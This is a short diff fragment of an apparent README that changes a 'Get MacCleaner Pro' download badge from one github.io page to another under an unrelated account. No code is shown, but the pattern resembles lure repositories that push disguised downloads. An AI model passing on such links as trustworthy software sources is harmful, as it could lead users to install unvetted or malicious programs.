@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://nikolanfu.github.io/.github/maccleanerpromac">  
+<a href="https://mitrobandus.github.io/.github/maccleanerpro">  
 <img src="https://img.shields.io/badge/Get_MacCleaner_Pro-darkblue?style=for-the-badge&logo=apple" alt="Get MacCleaner Pro">  
 </a>  
 </div>  
